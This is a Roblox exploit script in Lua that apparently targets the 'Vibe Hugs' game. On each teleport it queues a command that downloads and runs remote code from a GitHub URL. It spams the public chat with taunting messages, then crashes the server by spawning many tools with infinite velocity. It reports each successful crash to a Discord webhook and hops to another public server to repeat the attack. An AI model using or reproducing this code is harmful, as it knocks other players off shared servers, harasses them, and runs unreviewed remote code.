repeat wait() until game:IsLoaded()
syn.queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/tresks/Vibe-Crash/main/poop.lua"))()')
if isfile("webhookfortresk.txt") then
    _G.advert = true
    _G.sexycrash = true
end

trolling = 0
while task.wait() do -- poppy is so hot ;)
    if _G.advert then
        for i = 1,10 do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("This server is being crashed by the anti dater crew keep crying.", "All")
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("This server is being crashed by the anti dater crew keep crying.", "All")
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("This server is being crashed by the anti dater crew keep crying.", "All")
        end
    end
    if _G.sexycrash then
        _G.advert = false
        task.wait(.01)
        game:GetService("ReplicatedStorage").RE:FireServer("BuyItem", "Cookie")
        game:GetService("CoreGui").RobloxGui.Backpack.Visible = false
        task.wait()
        for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if v:IsA("Tool") and v.Name == "Cookie" then
                trolling = trolling + 1
                v.Handle.Transparency = 100
                v.Handle.Velocity = Vector3.new(math.huge, math.huge, math.huge)
                v.Parent = game.Players.LocalPlayer.Character
            end
        end
        for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if v:IsA("Tool") and v.Name == "Cookie" then
                v.Handle.Transparency = 100
                v.Handle.Velocity = Vector3.new(math.huge, math.huge, math.huge)
                v.Parent = game.Players.LocalPlayer.Character
            end
        end 
        if trolling >= 150 then
            _G.sexycrash = false
            for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if v:IsA("BasePart") or v:IsA("Accessory") then
                    v:Destroy()
                end
            end
            getgenv().rejoin = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
                if child.Name == 'ErrorPrompt' and child:FindFirstChild('MessageArea') and child.MessageArea:FindFirstChild("ErrorFrame") then
                    local data = {
                        ["content"] = "",
                        ["embeds"] = {
                            {
                                ["title"] = "Successful Crash!",
                                ["description"] = "The Vibe Hugs server has successfully been crashed.",
                                ["type"] = "rich",
                                ["color"] = 5825652,
                                ["footer"] = {
                                    ["text"] = "tresk was here",
                                    ["icon_url"] = "https://upload.wikimedia.org/wikipedia/en/thumb/9/9a/Trollface_non-free.png/220px-Trollface_non-free.png"
                                }
                            }
                        },
                        ["username"] = "😜",
                        ["avatar_url"] = "https://tr.rbxcdn.com/a08e4272a610d0aee9be0d23eb9af683/150/150/Image/Png",
                    }
                    local newdata = game:GetService("HttpService"):JSONEncode(data)
                    
                    local headers = {
                    ["content-type"] = "application/json"
                    }
                    local abcdef = {Url = readfile("webhookfortresk.txt"), Body = newdata, Method = "POST", Headers = headers}
                    syn.request(abcdef)
                    local servers = {}
                    local req = syn.request({Url = string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100", game.PlaceId)})
                    local body = game:GetService("HttpService"):JSONDecode(req.Body)
                    if body and body.data then
                        for i, v in next, body.data do
                            if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
                                table.insert(servers, 1, v.id)
                            end 
                        end
                    end
                    if #servers > 0 then
                        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
                    end
                end
            end)
        end
    end
end
